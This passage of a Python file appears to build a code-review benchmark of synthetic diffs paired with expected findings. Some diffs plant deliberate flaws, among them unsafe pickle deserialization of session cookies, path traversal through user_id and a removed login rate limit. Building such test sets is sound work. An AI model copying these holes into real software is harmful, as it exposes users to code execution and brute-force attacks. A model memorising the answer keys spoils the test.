 SECRET = os.environ["SESSION_SECRET"].encode()


 def load_session(cookie: str) -> dict:
     body_b64, sig = cookie.rsplit(".", 1)
     body = base64.urlsafe_b64decode(body_b64)
     expected = hmac.new(SECRET, body, "sha256").hexdigest()
     if not hmac.compare_digest(sig, expected):
         raise ValueError("bad signature")
-    return json.loads(body)
+    return pickle.loads(body)
""",
    [
        {
            "file": "auth/session.py",
            "line_start": 1,
            "line_end": 14,
            "category": "unsafe-deserialization",
            "severity": "critical",
            "description": (
                "Even though the cookie is HMAC-signed, switching the body decoder from "
                "json.loads to pickle.loads is dangerous. If SESSION_SECRET ever leaks "
                "(stale logs, prior compromise, weak rotation), an attacker who can mint "
                "a valid signature now has remote code execution via pickle's "
                "reduce/setstate machinery — json.loads only yields data. Keep the body "
                "as JSON; pickle should never be used to deserialize anything that "
                "reaches a network boundary."
            ),
        }
    ],
)

add(
    "cretu-026",
    "python",
    "medium",
    "Render last N samples in sliding window",
    """diff --git a/lib/metrics/window.py b/lib/metrics/window.py
index 33ee..44ff 100644
--- a/lib/metrics/window.py
+++ b/lib/metrics/window.py
@@ -1,11 +1,17 @@
+from typing import Iterable


+def last_n(samples: list[float], n: int) -> list[float]:
+    if len(samples) < n:
+        return samples
+    return samples[len(samples) - n:len(samples) - 1]
""",
    [
        {
            "file": "lib/metrics/window.py",
            "line_start": 6,
            "line_end": 6,
            "category": "off-by-one-slice",
            "severity": "high",
            "description": (
                "The slice endpoint is len(samples) - 1, which excludes the most recent "
                "sample. last_n([a,b,c,d], 2) returns [c] instead of [c, d]. The "
                "endpoint should just be len(samples), or simpler: 'return samples[-n:]'. "
                "Worth noting the 'if len < n: return samples' branch is also subtly "
                "wrong because it returns the underlying list rather than a copy, but "
                "that's a separate caveat."
            ),
        }
    ],
)

add(
    "cretu-027",
    "typescript",
    "medium",
    "Validate inbound webhook payload",
    """diff --git a/src/webhooks/parse.ts b/src/webhooks/parse.ts
index 77bb..88cc 100644
--- a/src/webhooks/parse.ts
+++ b/src/webhooks/parse.ts
@@ -1,14 +1,18 @@
 import { z } from "zod";

 const Schema = z.object({
   id: z.string(),
   amount: z.number().positive(),
   currency: z.string().length(3),
 });

-export function parsePayload(raw: unknown) {
-  return Schema.safeParse(raw);
-}
+export function parsePayload(raw: unknown) {
+  return Schema.parse(raw);
+}
""",
    [
        {
            "file": "src/webhooks/parse.ts",
            "line_start": 10,
            "line_end": 12,
            "category": "throwing-vs-result",
            "severity": "medium",
            "description": (
                "The function went from returning a SafeParseResult to a parsed value, "
                "and the return type implicitly changed from { success, data, error } to T. "
                "Every caller that previously branched on result.success is now silently "
                "broken: result.success is undefined (truthy check fails), the schema "
                "exception propagates as an uncaught throw, and webhook handlers will "
                "500 instead of returning a structured error. Either keep safeParse, or "
                "update every caller and wrap the throw with handler-level error mapping."
            ),
        }
    ],
)

add(
    "cretu-028",
    "python",
    "medium",
    "Stream large file to client",
    """diff --git a/api/download.py b/api/download.py
index 99aa..00bb 100644
--- a/api/download.py
+++ b/api/download.py
@@ -1,14 +1,20 @@
 from fastapi import APIRouter
 from fastapi.responses import StreamingResponse
 from pathlib import Path

 router = APIRouter()


+def _iter(path: Path):
+    f = open(path, "rb")
+    while chunk := f.read(64 * 1024):
+        yield chunk
+
+
 @router.get("/download/{file_id}")
 def download(file_id: str):
     path = resolve(file_id)
     return StreamingResponse(_iter(path), media_type="application/octet-stream")
""",
    [
        {
            "file": "api/download.py",
            "line_start": 8,
            "line_end": 11,
            "category": "resource-leak",
            "severity": "high",
            "description": (
                "The file handle is opened but never closed. The generator is exhausted "
                "naturally on the success path but neither path calls f.close() and the "
                "open() isn't wrapped in 'with'. If the client disconnects mid-stream the "
                "generator is garbage-collected without closing the fd (CPython is "
                "best-effort here, PyPy/Jython won't be); under load you exhaust fds. "
                "Wrap the open() in 'with', which also handles the GeneratorExit raised on "
                "disconnect."
            ),
        }
    ],
)


# ============================================================================
# HARD — multi-file diffs. The bug only surfaces when reading across files,
# or requires understanding an invariant that the diff breaks.
# ============================================================================

add(
    "cretu-029",
    "typescript",
    "hard",
    "Rename API field user.name -> user.fullName",
    """diff --git a/server/src/api/users.ts b/server/src/api/users.ts
index 11aa..22bb 100644
--- a/server/src/api/users.ts
+++ b/server/src/api/users.ts
@@ -10,12 +10,12 @@ router.get("/users/:id", async (req, res) => {
   const user = await db.user.findUnique({ where: { id: req.params.id } });
   if (!user) return res.status(404).json({ error: "not_found" });
   res.json({
     id: user.id,
-    name: user.displayName,
+    fullName: user.displayName,
     email: user.email,
     createdAt: user.createdAt,
   });
 });
diff --git a/server/src/api/__tests__/users.test.ts b/server/src/api/__tests__/users.test.ts
index 33cc..44dd 100644
--- a/server/src/api/__tests__/users.test.ts
+++ b/server/src/api/__tests__/users.test.ts
@@ -8,7 +8,7 @@ test("GET /users/:id returns shape", async () => {
   const res = await request(app).get("/users/u_1");
   expect(res.status).toBe(200);
   expect(res.body).toMatchObject({
     id: "u_1",
-    name: expect.any(String),
+    fullName: expect.any(String),
     email: expect.any(String),
   });
 });
diff --git a/mobile/src/screens/Profile.tsx b/mobile/src/screens/Profile.tsx
index 55ee..66ff 100644
--- a/mobile/src/screens/Profile.tsx
+++ b/mobile/src/screens/Profile.tsx
@@ -10,7 +10,7 @@ export function Profile({ userId }: { userId: string }) {
   const { data } = useQuery(["user", userId], () => fetchUser(userId));
   if (!data) return <Spinner />;
   return (
     <View>
-      <Text style={styles.name}>{data.name}</Text>
+      <Text style={styles.name}>{data.name}</Text>
       <Text style={styles.email}>{data.email}</Text>
     </View>
   );
""",
    [
        {
            "file": "mobile/src/screens/Profile.tsx",
            "line_start": 13,
            "line_end": 13,
            "category": "breaking-api-change",
            "severity": "high",
            "description": (
                "The server response field was renamed from 'name' to 'fullName' (the test "
                "was updated to match), but the mobile Profile screen still reads "
                "data.name. The mobile app will render an empty string in place of the "
                "user's name until the client is also updated. Either keep the old "
                "'name' key on the server during a deprecation window (alias both), or "
                "update Profile.tsx (and any other client callsites) in this same change."
            ),
        }
    ],
)

add(
    "cretu-030",
    "python",
    "hard",
    "Add 'company' to user signup",
    """diff --git a/migrations/2024_05_add_company_to_users.sql b/migrations/2024_05_add_company_to_users.sql
new file mode 100644
index 0000000..1a2b3c4
--- /dev/null
+++ b/migrations/2024_05_add_company_to_users.sql
@@ -0,0 +1,2 @@
+ALTER TABLE users
+    ADD COLUMN company TEXT NOT NULL;
diff --git a/api/signup.py b/api/signup.py
index 22aa..33bb 100644
--- a/api/signup.py
+++ b/api/signup.py
@@ -10,12 +10,17 @@ class SignupBody(BaseModel):
     email: EmailStr
     password: str
+    company: str


 @router.post("/signup")
 def signup(body: SignupBody):
     hashed = hash_password(body.password)
     db.execute(
-        "INSERT INTO users (email, password_hash) VALUES (%s, %s)",
-        (body.email, hashed),
+        "INSERT INTO users (email, password_hash, company) VALUES (%s, %s, %s)",
+        (body.email, hashed, body.company),
     )
     return {"ok": True}
diff --git a/jobs/seed/demo_users.py b/jobs/seed/demo_users.py
index 44cc..55dd 100644
--- a/jobs/seed/demo_users.py
+++ b/jobs/seed/demo_users.py
@@ -1,15 +1,20 @@
 from .db import db
 from .hash import hash_password


 DEMO_USERS = [
     ("demo1@example.com", "demo123"),
     ("demo2@example.com", "demo123"),
 ]


 def seed_demo() -> None:
     for email, pw in DEMO_USERS:
         db.execute(
             "INSERT INTO users (email, password_hash) VALUES (%s, %s)",
             (email, hash_password(pw)),
         )
""",
    [
        {
            "file": "migrations/2024_05_add_company_to_users.sql",
            "line_start": 1,
            "line_end": 2,
            "category": "migration-not-null-no-default",
            "severity": "critical",
            "description": (
                "The new 'company' column is NOT NULL with no DEFAULT, applied to a table "
                "that already has rows. The migration will fail on any environment that "
                "isn't empty — staging/production rollouts get rejected with 'column "
                '"company" contains null values\'. Even if you backfill before adding the '
                "constraint, this single-statement migration cannot succeed against "
                "existing data. Add a DEFAULT '' (or a sensible value) for the migration, "
                "or split into add-column-nullable + backfill + add-not-null-constraint."
            ),
        },
        {
            "file": "jobs/seed/demo_users.py",
            "line_start": 12,
            "line_end": 16,
            "category": "stale-insert-callsite",
            "severity": "high",
            "description": (
                "demo_users.py still INSERTs only (email, password_hash), with no "
                "'company' column. Once the migration above is applied, this seed script "
                "will start raising 'null value in column \"company\" violates not-null "
                "constraint'. CI seeding and dev bootstrap both break. Update the INSERT "
                "to include the new column."
            ),
        },
    ],
)

add(
    "cretu-031",
    "typescript",
    "hard",
    "Roll out new pricing page behind feature flag",
    """diff --git a/src/server/routes/pricing.ts b/src/server/routes/pricing.ts
index 11ee..22ff 100644
--- a/src/server/routes/pricing.ts
+++ b/src/server/routes/pricing.ts
@@ -1,16 +1,15 @@
 import { Router } from "express";
-import { isFlagEnabled } from "../flags";
 import { renderPricing, renderLegacyPricing } from "../views";

 export const pricingRouter = Router();

-pricingRouter.get("/pricing", async (req, res) => {
-  if (await isFlagEnabled("new_pricing_page", req.user)) {
-    return res.send(renderPricing());
-  }
-  return res.send(renderLegacyPricing());
-});
+pricingRouter.get("/pricing", async (req, res) => {
+  return res.send(renderPricing());
+});
diff --git a/src/server/routes/api.ts b/src/server/routes/api.ts
index 33aa..44bb 100644
--- a/src/server/routes/api.ts
+++ b/src/server/routes/api.ts
@@ -10,7 +10,7 @@ import { isFlagEnabled } from "../flags";
 apiRouter.get("/api/pricing", async (req, res) => {
   if (await isFlagEnabled("new_pricing_page", req.user)) {
     return res.json(await pricingPayloadV2());
   }
   return res.json(await pricingPayloadV1());
 });
""",
    [
        {
            "file": "src/server/routes/pricing.ts",
            "line_start": 8,
            "line_end": 10,
            "category": "inconsistent-flag-cleanup",
            "severity": "high",
            "description": (
                "The new_pricing_page flag was removed from the HTML page route but is "
                "still gating /api/pricing in api.ts. Users with the flag off now see the "
                "new HTML pricing UI rendering against the V1 API payload, which has a "
                "different shape — the page breaks or displays stale numbers. Either roll "
                "out fully (remove the flag from both routes), or keep the flag on both "
                "during the rollout window."
            ),
        }
    ],
)

add(
    "cretu-032",
    "python",
    "hard",
    "Move rate limit decorator off /login during route reorganization",
    """diff --git a/api/__init__.py b/api/__init__.py
index 11aa..22bb 100644
--- a/api/__init__.py
+++ b/api/__init__.py
@@ -1,12 +1,14 @@
 from fastapi import FastAPI
-from .auth import router as auth_router
+from .auth import login_router, account_router
 from .billing import router as billing_router


 app = FastAPI()
-app.include_router(auth_router, prefix="/auth")
+app.include_router(login_router)
+app.include_router(account_router, prefix="/account")
 app.include_router(billing_router, prefix="/billing")
diff --git a/api/auth.py b/api/auth.py
index 33cc..44dd 100644
--- a/api/auth.py
+++ b/api/auth.py
@@ -1,28 +1,25 @@
 from fastapi import APIRouter, Depends, HTTPException
 from .deps import current_user, rate_limit
 from .crypto import verify_password
 from .db import users

-router = APIRouter()
+login_router = APIRouter()
+account_router = APIRouter()


-@router.post("/login", dependencies=[Depends(rate_limit("5/minute"))])
+@login_router.post("/login")
 def login(email: str, password: str):
     user = users.find_by_email(email)
     if not user or not verify_password(password, user.password_hash):
         raise HTTPException(status_code=401, detail="invalid_credentials")
     return {"token": issue_token(user)}


-@router.post("/logout")
-def logout(user=Depends(current_user)):
-    return {"ok": True}
-
-
-@router.get("/me")
-def me(user=Depends(current_user)):
-    return user.public_dict()
+@account_router.post("/logout")
+def logout(user=Depends(current_user)):
+    return {"ok": True}
+
+
+@account_router.get("/me")
+def me(user=Depends(current_user)):
+    return user.public_dict()
""",
    [
        {
            "file": "api/auth.py",
            "line_start": 12,
            "line_end": 13,
            "category": "missing-rate-limit",
            "severity": "critical",
            "description": (
                "During the router split the rate_limit dependency was dropped from "
                "/login (the old decorator included 'dependencies=[Depends(rate_limit(\"5/"
                "minute\"))]'; the new POST decorator on login_router has no dependencies "
                "argument). /login is now unbounded — credential stuffing and brute-force "
                "attempts are no longer throttled. Re-attach Depends(rate_limit(\"5/"
                "minute\")) to the new login decorator, or apply it at the login_router "
                "level so it can't be silently dropped on the next refactor."
            ),
        }
    ],
)

add(
    "cretu-033",
    "python",
    "hard",
    "Add update path to user prefs (cache invalidation)",
    """diff --git a/services/prefs/store.py b/services/prefs/store.py
index 22cc..33dd 100644
--- a/services/prefs/store.py
+++ b/services/prefs/store.py
@@ -1,28 +1,38 @@
 from .cache import cache
 from .db import db


 def get(user_id: int) -> dict:
     cached = cache.get(f"prefs:{user_id}")
     if cached is not None:
         return cached
     row = db.execute(
         "SELECT payload FROM user_prefs WHERE user_id = %s", (user_id,)
     ).fetchone()
     payload = row["payload"] if row else {}
     cache.set(f"prefs:{user_id}", payload, ttl=600)
     return payload


+def update(user_id: int, patch: dict) -> dict:
+    current = get(user_id)
+    merged = {**current, **patch}
+    db.execute(
+        "INSERT INTO user_prefs (user_id, payload) VALUES (%s, %s) "
+        "ON CONFLICT (user_id) DO UPDATE SET payload = EXCLUDED.payload",
+        (user_id, merged),
+    )
+    return merged


 def delete(user_id: int) -> None:
     db.execute("DELETE FROM user_prefs WHERE user_id = %s", (user_id,))
     cache.delete(f"prefs:{user_id}")
diff --git a/api/prefs.py b/api/prefs.py
index 55ee..66ff 100644
--- a/api/prefs.py
+++ b/api/prefs.py
@@ -1,14 +1,18 @@
 from fastapi import APIRouter, Depends
 from services.prefs.store import get, update, delete

 router = APIRouter()


 @router.get("/prefs")
 def get_prefs(user=Depends(current_user)):
     return get(user.id)


+@router.patch("/prefs")
+def patch_prefs(patch: dict, user=Depends(current_user)):
+    return update(user.id, patch)
""",
    [
        {
            "file": "services/prefs/store.py",
            "line_start": 17,
            "line_end": 25,
            "category": "missing-cache-invalidation",
            "severity": "high",
            "description": (
                "update() writes the new payload to the DB but never invalidates the "
                "cache entry for that user. The delete() helper just below correctly "
                "calls cache.delete; update() should mirror that. As written, immediately "
                "after PATCH /prefs the GET /prefs continues to return the old cached "
                "payload for up to 600 seconds, so the UI shows the user 'your save "
                "failed' even though it succeeded. Either cache.delete(f\"prefs:"
                "{user_id}\") after the write, or cache.set(..., merged) to refresh in "
                "place."
            ),
        }
    ],
)

add(
    "cretu-034",
    "typescript",
    "hard",
    "Add admin tag in user enum + display map",
    """diff --git a/src/types/role.ts b/src/types/role.ts
index 99aa..00bb 100644
--- a/src/types/role.ts
+++ b/src/types/role.ts
@@ -1,10 +1,11 @@
 export type Role =
   | "member"
   | "manager"
+  | "admin"
   | "owner";

 export const ROLE_DISPLAY: Record<Role, string> = {
   member: "Member",
   manager: "Manager",
+  admin: "Admin",
   owner: "Owner",
 };
diff --git a/src/auth/permissions.ts b/src/auth/permissions.ts
index 33cc..44dd 100644
--- a/src/auth/permissions.ts
+++ b/src/auth/permissions.ts
@@ -1,18 +1,20 @@
 import { Role } from "../types/role";

 export function canInviteOthers(role: Role): boolean {
   switch (role) {
     case "member":
       return false;
     case "manager":
       return true;
     case "owner":
       return true;
+    default:
+      return false;
   }
 }
""",
    [
        {
            "file": "src/auth/permissions.ts",
            "line_start": 4,
            "line_end": 13,
            "category": "missing-enum-case",
            "severity": "high",
            "description": (
                "The new 'admin' Role variant has no case in canInviteOthers. The switch "
                "falls through to the newly added 'default: return false', so an admin "
                "cannot invite anyone — likely the opposite of intent given the new role "
                "sits between manager and owner in the type. Worse, the 'default' branch "
                "hides exactly this kind of mistake from TypeScript: without it, "
                "exhaustive-check tooling (or assertNever) would have surfaced the missing "
                "case at compile time. Add 'case \"admin\": return true' and consider "
                "replacing the default with an assertNever(role) call."
            ),
        }
    ],
)

add(
    "cretu-035",
    "python",
    "hard",
    "Refactor: swap (limit, offset) -> (offset, limit) in shared helper",
    """diff --git a/lib/db/pagination.py b/lib/db/pagination.py
index 11cc..22dd 100644
--- a/lib/db/pagination.py
+++ b/lib/db/pagination.py
@@ -1,8 +1,8 @@
-def paginate(query: str, limit: int, offset: int) -> str:
+def paginate(query: str, offset: int, limit: int) -> str:
     return f"{query} LIMIT {limit} OFFSET {offset}"
diff --git a/api/orders.py b/api/orders.py
index 33ee..44ff 100644
--- a/api/orders.py
+++ b/api/orders.py
@@ -1,12 +1,12 @@
 from lib.db.pagination import paginate
 from .db import db


 def list_orders(page: int, size: int) -> list[dict]:
     offset = (page - 1) * size
-    sql = paginate("SELECT * FROM orders ORDER BY created_at DESC", size, offset)
+    sql = paginate("SELECT * FROM orders ORDER BY created_at DESC", offset, size)
     return [dict(r) for r in db.execute(sql).fetchall()]
diff --git a/api/invoices.py b/api/invoices.py
index 55aa..66bb 100644
--- a/api/invoices.py
+++ b/api/invoices.py
@@ -1,12 +1,12 @@
 from lib.db.pagination import paginate
 from .db import db


 def list_invoices(page: int, size: int) -> list[dict]:
     offset = (page - 1) * size
     sql = paginate("SELECT * FROM invoices ORDER BY id DESC", size, offset)
     return [dict(r) for r in db.execute(sql).fetchall()]
""",
    [
        {
            "file": "api/invoices.py",
            "line_start": 6,
            "line_end": 6,
            "category": "missed-callsite",
            "severity": "high",
            "description": (
                "paginate()'s parameter order was swapped from (limit, offset) to "
                "(offset, limit). api/orders.py was updated to match, but api/invoices.py "
                "still passes (size, offset). With size=20, page=1 that produces "
                "'LIMIT 0 OFFSET 20', returning an empty page; with page=2 you get "
                "'LIMIT 20 OFFSET 40' which silently skips items. The arguments are both "
                "int so the type checker won't catch it. Either update the invoices "
                "callsite, or make paginate use keyword-only args so all callsites must "
                "name them and a future swap breaks loudly."
            ),
        }
    ],
)

add(
    "cretu-036",
    "python",
    "hard",
    "Move from snake_case API to camelCase response",
    """diff --git a/api/schemas/order.py b/api/schemas/order.py
index 22aa..33bb 100644
--- a/api/schemas/order.py
+++ b/api/schemas/order.py
@@ -1,16 +1,21 @@
 from pydantic import BaseModel, ConfigDict


+def _to_camel(s: str) -> str:
+    parts = s.split("_")
+    return parts[0] + "".join(p.title() for p in parts[1:])
+
+
 class OrderOut(BaseModel):
-    model_config = ConfigDict(populate_by_name=True)
+    model_config = ConfigDict(alias_generator=_to_camel, populate_by_name=True)

     id: str
     user_id: str
     line_items: list[dict]
     total_cents: int
     created_at: str
diff --git a/web/src/pages/order/[id].tsx b/web/src/pages/order/[id].tsx
index 44cc..55dd 100644
--- a/web/src/pages/order/[id].tsx
+++ b/web/src/pages/order/[id].tsx
@@ -10,12 +10,12 @@ export default function OrderPage({ orderId }: { orderId: string }) {
   if (!data) return <Spinner />;
   return (
     <div>
       <h1>Order {data.id}</h1>
       <p>Customer: {data.user_id}</p>
       <p>Total: ${(data.total_cents / 100).toFixed(2)}</p>
       <ul>
-        {data.line_items.map((li) => (
+        {data.line_items.map((li) => (
           <li key={li.sku}>{li.qty} × {li.sku}</li>
         ))}
       </ul>
     </div>
   );
 }
""",
    [
        {
            "file": "web/src/pages/order/[id].tsx",
            "line_start": 14,
            "line_end": 17,
            "category": "casing-mismatch",
            "severity": "high",
            "description": (
                "OrderOut now serializes with an alias_generator producing camelCase keys "
                "(userId, lineItems, totalCents, createdAt). The web page still reads "
                "data.user_id, data.total_cents, data.line_items — all undefined under "
                "the new shape. The page will render '$NaN' for the total and crash on "
                ".map() of undefined. Either update every property access to camelCase, "
                "or keep alias_generator with serialize_by_alias=False so the server still "
                "emits snake_case during the transition window."
            ),
        }
    ],
)

add(
    "cretu-037",
    "python",
    "hard",
    "Move file write to background task",
    """diff --git a/api/upload.py b/api/upload.py
index 88aa..99bb 100644
--- a/api/upload.py
+++ b/api/upload.py
@@ -1,18 +1,24 @@
 from fastapi import APIRouter, BackgroundTasks, UploadFile, File
 from .processor import process_upload
 from .storage import save_to_disk

 router = APIRouter()


+def _persist_and_process(tmp_path: str, user_id: str) -> None:
+    saved = save_to_disk(tmp_path, user_id)
+    process_upload(saved)
+
+
 @router.post("/upload")
 async def upload(
     bg: BackgroundTasks,
     user_id: str,
     file: UploadFile = File(...),
 ):
     tmp_path = await stash_temp(file)
-    bg.add_task(_persist_and_process, tmp_path, user_id)
+    bg.add_task(_persist_and_process, tmp_path, user_id)
     return {"ok": True}
diff --git a/api/storage.py b/api/storage.py
index 33dd..44ee 100644
--- a/api/storage.py
+++ b/api/storage.py
@@ -1,18 +1,22 @@
 import os
 from pathlib import Path

 UPLOAD_ROOT = Path("/var/lib/uploads")


+def save_to_disk(tmp_path: str, user_id: str) -> Path:
+    dest_dir = UPLOAD_ROOT / user_id
+    dest_dir.mkdir(parents=True, exist_ok=True)
+    name = Path(tmp_path).name
+    dest = dest_dir / name
+    os.rename(tmp_path, dest)
+    return dest
""",
    [
        {
            "file": "api/storage.py",
            "line_start": 7,
            "line_end": 12,
            "category": "path-traversal",
            "severity": "critical",
            "description": (
                "user_id flows directly into the destination directory path "
                "(UPLOAD_ROOT / user_id) with no validation. A user_id of '../etc' "
                "writes uploads to /var/lib/etc/..., and '/' or '..' segments let an "
                "attacker escape UPLOAD_ROOT entirely. The upload endpoint takes user_id "
                "from the request body, so this is reachable by any caller. Validate "
                "user_id against an allow-listed pattern (e.g. UUIDv4 regex) before "
                "joining, or resolve the final path and assert it's inside UPLOAD_ROOT."
            ),
        }
    ],
)

add(
    "cretu-038",
    "typescript",
    "hard",
    "Promote analytics page from pages/ to app/",
    """diff --git a/app/analytics/page.tsx b/app/analytics/page.tsx
new file mode 100644
index 0000000..1a2b3c4
--- /dev/null
+++ b/app/analytics/page.tsx
@@ -0,0 +1,18 @@
+import { fetchAnalytics } from "@/lib/analytics";
+import { AnalyticsChart } from "@/components/AnalyticsChart";
+import { useUser } from "@/hooks/useUser";
+
+export default async function AnalyticsPage() {
+  const user = useUser();
+  const data = await fetchAnalytics(user.id);
+
+  return (
+    <main>
+      <h1>Analytics</h1>
+      <AnalyticsChart data={data} />
+    </main>
+  );
+}
diff --git a/components/AnalyticsChart.tsx b/components/AnalyticsChart.tsx
index 22cc..33dd 100644
--- a/components/AnalyticsChart.tsx
+++ b/components/AnalyticsChart.tsx
@@ -1,11 +1,12 @@
+"use client";
 import { useMemo } from "react";

 export function AnalyticsChart({ data }: { data: Series[] }) {
   const points = useMemo(() => data.map(toPoint), [data]);
   return <svg>{points.map(renderPoint)}</svg>;
 }
diff --git a/pages/analytics.tsx b/pages/analytics.tsx
deleted file mode 100644
index 44ee..0000000
--- a/pages/analytics.tsx
+++ /dev/null
@@ -1,16 +0,0 @@
-"use client";
-import { useState, useEffect } from "react";
-...
""",
    [
        {
            "file": "app/analytics/page.tsx",
            "line_start": 3,
            "line_end": 7,
            "category": "rsc-violation",
            "severity": "critical",
            "description": (
                "AnalyticsPage is an async Server Component (no 'use client' directive, "
                "and exported as 'async function') yet it imports and calls useUser, a "
                "React hook. Hooks only work in Client Components — the build will fail "
                "with 'You're importing a component that needs useUser. It only works in "
                "a Client Component.' Either move user lookup to a server-side primitive "
                "(an auth() helper that reads cookies/headers), or split the page into a "
                "server shell that fetches data and a small client child that calls "
                "useUser."
            ),
        }
    ],
)

add(
    "cretu-039",
    "rust",
    "hard",
    "Hold session lock across async retry",
    """diff --git a/src/session/store.rs b/src/session/store.rs
index 33aa..44bb 100644
--- a/src/session/store.rs
+++ b/src/session/store.rs
@@ -1,28 +1,36 @@
-use std::sync::Mutex;
+use std::sync::Mutex;
 use std::collections::HashMap;

 pub struct SessionStore {
     inner: Mutex<HashMap<String, Session>>,
 }

 impl SessionStore {
-    pub fn get(&self, id: &str) -> Option<Session> {
-        self.inner.lock().unwrap().get(id).cloned()
-    }
+    pub async fn refresh(&self, id: &str, fetcher: &Fetcher) -> Result<Session, Error> {
+        let mut guard = self.inner.lock().unwrap();
+        let stale = guard.get(id).cloned();
+
+        let fresh = fetcher.fetch(id).await?;
+
+        guard.insert(id.to_string(), fresh.clone());
+        Ok(fresh)
+    }
 }
diff --git a/src/api/me.rs b/src/api/me.rs
index 77ee..88ff 100644
--- a/src/api/me.rs
+++ b/src/api/me.rs
@@ -1,12 +1,16 @@
 use crate::session::store::SessionStore;
 use std::sync::Arc;

+pub async fn me(store: Arc<SessionStore>, session_id: String, fetcher: Fetcher)
+    -> Result<Session, Error>
+{
+    store.refresh(&session_id, &fetcher).await
+}
""",
    [
        {
            "file": "src/session/store.rs",
            "line_start": 10,
            "line_end": 18,
            "category": "lock-across-await",
            "severity": "critical",
            "description": (
                "refresh() acquires std::sync::Mutex's guard and then awaits "
                "fetcher.fetch(). std::sync::MutexGuard is !Send, so the future is also "
                "!Send and won't compile on a multi-threaded tokio runtime; if it did "
                "compile (single-thread runtime), it would block other tasks that need the "
                "same Mutex for the entire duration of the network fetch, defeating async. "
                "Use tokio::sync::Mutex (whose guard is Send-safe across awaits), or drop "
                "the std guard before .await — read the stale value, release, then fetch, "
                "then re-acquire to insert."
            ),
        }
    ],
)

add(
    "cretu-040",
    "python",
    "hard",
    "Add per-tenant DB connection pool",
    """diff --git a/lib/db/pool.py b/lib/db/pool.py
index 11dd..22ee 100644
--- a/lib/db/pool.py
+++ b/lib/db/pool.py
@@ -1,28 +1,38 @@
 import threading
 import psycopg2.pool

 _pools: dict[str, psycopg2.pool.ThreadedConnectionPool] = {}
 _lock = threading.Lock()


-def get_pool(tenant_id: str) -> psycopg2.pool.ThreadedConnectionPool:
-    with _lock:
-        if tenant_id not in _pools:
-            _pools[tenant_id] = _build_pool(tenant_id)
-        return _pools[tenant_id]
+def get_pool(tenant_id: str) -> psycopg2.pool.ThreadedConnectionPool:
+    if tenant_id in _pools:
+        return _pools[tenant_id]
+    with _lock:
+        if tenant_id not in _pools:
+            _pools[tenant_id] = _build_pool(tenant_id)
+        return _pools[tenant_id]
diff --git a/api/middleware/tenant.py b/api/middleware/tenant.py
index 33aa..44bb 100644
--- a/api/middleware/tenant.py
+++ b/api/middleware/tenant.py
@@ -1,14 +1,17 @@
 from .pool import get_pool


+async def tenant_db(request):
+    tenant_id = request.headers["x-tenant"]
+    pool = get_pool(tenant_id)
+    return pool.getconn()
""",
    [
        {
            "file": "lib/db/pool.py",
            "line_start": 9,
            "line_end": 14,
            "category": "double-checked-locking-broken",
            "severity": "medium",
            "description": (
                "The double-checked locking pattern here is unsafe with a plain dict in "
                "CPython. The unlocked 'if tenant_id in _pools: return _pools[tenant_id]' "
                "can race with the writer inside the locked section — the reader may see "
                "a half-populated entry on non-CPython implementations, and on CPython "
                "the dict mutation isn't guaranteed atomic across all operations the way "
                "this pattern presumes. The previous always-locked version was correct "
                "and the contention is on pool creation only (rare), not on lookup. "
                "Revert, or use a dict subclass with explicit publication semantics."
            ),
        }
    ],
)


# ============================================================================
# CLEAN — looks suspicious at a glance, but is actually correct.
# Tests whether the model raises false alarms.
# ============================================================================

add(
    "cretu-041",
    "python",
    "clean",
    "Refactor: extract whitelisted-column ORDER BY helper",
    """diff --git a/api/search.py b/api/search.py
index 33aa..44bb 100644
--- a/api/search.py
+++ b/api/search.py
@@ -1,18 +1,24 @@
 from enum import Enum
 from .db import db


 class SortColumn(str, Enum):
     name = "name"
     created_at = "created_at"
     updated_at = "updated_at"


+def _order_clause(sort: SortColumn) -> str:
+    # sort is constrained to the SortColumn enum at the FastAPI boundary,
+    # so its .value is one of three known-safe column names. Splicing is safe.
+    return f"ORDER BY {sort.value} ASC"
+
+
 def search(name: str, sort: SortColumn = SortColumn.name) -> list[dict]:
     rows = db.execute(
         f"SELECT id, name FROM widgets WHERE name LIKE %s {_order_clause(sort)} LIMIT 100",
         (f"%{name}%",),
     ).fetchall()
     return [dict(r) for r in rows]
""",
    [],
)

add(
    "cretu-042",
    "python",
    "clean",
    "Add wrapper that logs and re-raises",
    """diff --git a/lib/errors/wrap.py b/lib/errors/wrap.py
index 99aa..00bb 100644
--- a/lib/errors/wrap.py
+++ b/lib/errors/wrap.py
@@ -1,12 +1,18 @@
 import logging
 from functools import wraps

 log = logging.getLogger(__name__)


+def log_and_reraise(fn):
+    @wraps(fn)
+    def inner(*args, **kwargs):
+        try:
+            return fn(*args, **kwargs)
+        except Exception:
+            log.exception("call to %s failed", fn.__qualname__)
+            raise
+    return inner
""",
    [],
)

add(
    "cretu-043",
    "python",
    "clean",
    "Add helper with mutable default replaced by None sentinel",
    """diff --git a/services/audit/events.py b/services/audit/events.py
index 22cc..33dd 100644
--- a/services/audit/events.py
+++ b/services/audit/events.py
@@ -1,10 +1,18 @@
+def record(action: str, tags: list[str] | None = None) -> dict:
+    if tags is None:
+        tags = []
+    entry = {"action": action, "tags": tags}
+    _journal.append(entry)
+    return entry
""",
    [],
)

add(
    "cretu-044",
    "typescript",
    "clean",
    "One-shot subscription on mount via empty deps array",
    """diff --git a/src/components/StatusBanner.tsx b/src/components/StatusBanner.tsx
index 11aa..22bb 100644
--- a/src/components/StatusBanner.tsx
+++ b/src/components/StatusBanner.tsx
@@ -1,18 +1,24 @@
 import { useEffect, useState } from "react";
 import { subscribeToStatus, Status } from "../api/status";

+export function StatusBanner() {
+  const [status, setStatus] = useState<Status>("ok");
+
+  useEffect(() => {
+    // intentional one-shot subscription; setStatus is a stable setter
+    // and subscribeToStatus retains no state from outside its closure.
+    const unsub = subscribeToStatus(setStatus);
+    return unsub;
+  }, []);
+
+  if (status === "ok") return null;
+  return <div className="banner">Status: {status}</div>;
+}
""",
    [],
)

add(
    "cretu-045",
    "python",
    "clean",
    "Use eval() on a hardcoded constant expression",
    """diff --git a/lib/units/convert.py b/lib/units/convert.py
index 44aa..55bb 100644
--- a/lib/units/convert.py
+++ b/lib/units/convert.py
@@ -1,18 +1,22 @@
+# Compile-time constants. eval() never receives user input; the strings here
+# are part of the source file and are evaluated once at module import.
+_CONVERSIONS = {
+    ("ft", "m"): eval("0.3048"),
+    ("m", "ft"): eval("1 / 0.3048"),
+    ("lb", "kg"): eval("0.45359237"),
+    ("kg", "lb"): eval("1 / 0.45359237"),
+}
+
+
+def convert(value: float, frm: str, to: str) -> float:
+    return value * _CONVERSIONS[(frm, to)]
""",
    [],
)

add(
    "cretu-046",
    "go",
    "clean",
